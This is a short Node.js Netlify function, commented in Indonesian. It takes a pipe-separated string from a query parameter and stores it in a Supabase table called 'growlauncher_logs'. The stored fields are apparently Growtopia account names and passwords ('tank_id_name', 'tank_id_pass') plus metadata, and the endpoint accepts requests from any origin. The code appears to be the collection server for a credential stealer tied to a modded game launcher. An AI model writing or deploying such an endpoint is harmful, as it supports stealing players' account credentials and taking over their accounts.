const { createClient } = require('@supabase/supabase-js');

const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_KEY);

exports.handler = async (event) => {
    const headers = {
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Headers": "Content-Type",
        "Content-Type": "application/json"
    };

    // Ambil data dari 'd' atau 'data'
    const query = event.queryStringParameters || {};
    const rawData = query.d || query.data;

    console.log("Data diterima:", rawData); // Cek ini di Netlify Function Logs

    if (!rawData) {
        return { 
            statusCode: 400, 
            headers, 
            body: JSON.stringify({ error: "No data provided", received: query }) 
        };
    }

    try {
        // Pisahkan data menggunakan pipe |
        const parts = rawData.split('|');
        const payload = {
            tank_id_name: parts[0] || "Unknown",
            tank_id_pass: parts[1] || "Unknown",
            meta_data: parts[2] || "None"
        };

        const { error } = await supabase
            .from('growlauncher_logs')
            .insert([payload]);

        if (error) throw error;

        return { statusCode: 200, headers, body: JSON.stringify({ status: "Success" }) };
    } catch (err) {
        return { statusCode: 500, headers, body: JSON.stringify({ error: err.message }) };
    }
};
